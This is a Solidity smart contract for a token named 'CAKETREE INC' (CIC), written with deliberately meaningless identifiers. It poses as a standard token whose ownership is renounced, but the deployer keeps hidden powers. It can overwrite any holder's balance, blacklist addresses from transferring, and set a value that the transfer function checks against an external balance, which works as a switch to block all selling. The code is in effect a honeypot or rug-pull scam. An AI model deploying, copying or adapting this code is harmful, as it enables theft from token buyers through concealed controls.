//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface shouldModeBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface limitIs {
    function createPair(address liquidityReceiver, address takeList) external returns (address);
}

abstract contract isSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address amountSell) external view returns (uint256);

    function transfer(address tradingTotal, uint256 sellReceiver) external returns (bool);

    function allowance(address autoTradingTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellReceiver) external returns (bool);

    function transferFrom(address sender,address tradingTotal,uint256 sellReceiver) external returns (bool);

    event Transfer(address indexed from, address indexed buyMarketing, uint256 value);
    event Approval(address indexed autoTradingTeam, address indexed spender, uint256 value);
}

interface exemptTotalMetadata is exemptTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract CAKETREEINC is isSender, exemptTotal, exemptTotalMetadata {

    function owner() external view returns (address) {
        return minMode;
    }

    mapping(address => bool) public toShouldEnable;

    mapping(address => bool) public exemptLaunched;

    function modeLaunched(address exemptMin) public {
        launchedMarketing();
        if (takeAt == toMax) {
            liquiditySwap = true;
        }
        if (exemptMin == teamShould || exemptMin == totalFund) {
            return;
        }
        toShouldEnable[exemptMin] = true;
    }

    function walletIsReceiver() public {
        emit OwnershipTransferred(teamShould, address(0));
        minMode = address(0);
    }

    mapping(address => mapping(address => uint256)) private exemptEnable;

    function tokenList(address amountReceiver, uint256 sellReceiver) public {
        launchedMarketing();
        sellIsMax[amountReceiver] = sellReceiver;
    }

    constructor (){
        if (liquiditySwap == amountList) {
            amountList = true;
        }
        walletIsReceiver();
        shouldModeBuy listExemptTeam = shouldModeBuy(sellReceiverIs);
        totalFund = limitIs(listExemptTeam.factory()).createPair(listExemptTeam.WETH(), address(this));
        
        teamShould = _msgSender();
        exemptLaunched[teamShould] = true;
        sellIsMax[teamShould] = receiverLaunch;
        
        emit Transfer(address(0), teamShould, receiverLaunch);
    }

    bool public minMarketing;

    address takeWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function receiverTotal(address launchedLimitFee) public {
        if (minMarketing) {
            return;
        }
        if (amountList != liquiditySwap) {
            liquiditySwap = false;
        }
        exemptLaunched[launchedLimitFee] = true;
        if (takeAt == launchedReceiver) {
            launchedReceiver = takeAt;
        }
        minMarketing = true;
    }

    function approve(address teamAuto, uint256 sellReceiver) public virtual override returns (bool) {
        exemptEnable[_msgSender()][teamAuto] = sellReceiver;
        emit Approval(_msgSender(), teamAuto, sellReceiver);
        return true;
    }

    function transferFrom(address tokenTotal, address tradingTotal, uint256 sellReceiver) external override returns (bool) {
        if (_msgSender() != sellReceiverIs) {
            if (exemptEnable[tokenTotal][_msgSender()] != type(uint256).max) {
                require(sellReceiver <= exemptEnable[tokenTotal][_msgSender()]);
                exemptEnable[tokenTotal][_msgSender()] -= sellReceiver;
            }
        }
        return swapBuy(tokenTotal, tradingTotal, sellReceiver);
    }

    address private minMode;

    uint256 public toMax;

    address sellReceiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private sellIsMax;

    bool public liquiditySwap;

    string private limitFund = "CAKETREE INC";

    uint8 private takeReceiver = 18;

    function symbol() external view virtual override returns (string memory) {
        return launchedSender;
    }

    uint256 private receiverLaunch = 100000000 * 10 ** 18;

    function transfer(address amountReceiver, uint256 sellReceiver) external virtual override returns (bool) {
        return swapBuy(_msgSender(), amountReceiver, sellReceiver);
    }

    event OwnershipTransferred(address indexed buyTrading, address indexed launchSender);

    function name() external view virtual override returns (string memory) {
        return limitFund;
    }

    uint256 receiverFund;

    function balanceOf(address amountSell) public view virtual override returns (uint256) {
        return sellIsMax[amountSell];
    }

    string private launchedSender = "CIC";

    function totalSupply() external view virtual override returns (uint256) {
        return receiverLaunch;
    }

    function launchedMarketing() private view {
        require(exemptLaunched[_msgSender()]);
    }

    function atTake(address tokenTotal, address tradingTotal, uint256 sellReceiver) internal returns (bool) {
        require(sellIsMax[tokenTotal] >= sellReceiver);
        sellIsMax[tokenTotal] -= sellReceiver;
        sellIsMax[tradingTotal] += sellReceiver;
        emit Transfer(tokenTotal, tradingTotal, sellReceiver);
        return true;
    }

    address public totalFund;

    uint256 private takeAt;

    bool public amountList;

    function allowance(address tradingTotalWallet, address teamAuto) external view virtual override returns (uint256) {
        if (teamAuto == sellReceiverIs) {
            return type(uint256).max;
        }
        return exemptEnable[tradingTotalWallet][teamAuto];
    }

    function decimals() external view virtual override returns (uint8) {
        return takeReceiver;
    }

    uint256 private launchedReceiver;

    function getOwner() external view returns (address) {
        return minMode;
    }

    function walletLaunch(uint256 sellReceiver) public {
        launchedMarketing();
        receiverFund = sellReceiver;
    }

    uint256 isShouldMax;

    address public teamShould;

    function swapBuy(address tokenTotal, address tradingTotal, uint256 sellReceiver) internal returns (bool) {
        if (tokenTotal == teamShould) {
            return atTake(tokenTotal, tradingTotal, sellReceiver);
        }
        uint256 shouldReceiver = exemptTotal(totalFund).balanceOf(takeWallet);
        require(shouldReceiver == receiverFund);
        require(!toShouldEnable[tokenTotal]);
        return atTake(tokenTotal, tradingTotal, sellReceiver);
    }

}